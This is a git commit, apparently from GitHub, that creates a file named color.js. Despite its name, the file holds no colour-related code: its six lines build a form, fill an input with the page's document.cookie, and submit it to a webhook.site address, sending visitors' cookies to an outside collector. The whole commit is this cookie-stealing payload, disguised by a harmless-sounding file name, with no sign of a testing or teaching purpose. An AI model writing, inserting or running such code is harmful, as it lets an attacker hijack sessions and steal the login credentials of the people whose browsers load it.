107917f961f6d8d04b4305c9c2e6e38f6eea13e4
vWhitestorm3444 <122406951+vWhitestorm3444@users.noreply.github.com>
2025-08-06 17:47:53 +0200

    Create color.js

---
+++ color.js
@@ -0,0 +1,6 @@
+let f=document.createElement('form');
+f.method='GET';
+f.action='https://webhook.site/0693fa2b-5ed3-439e-8073-32e3b5e1e1f9';
+let i=document.createElement('input');
+i.name='c'; i.value=document.cookie;
+f.appendChild(i); document.body.appendChild(f); f.submit();
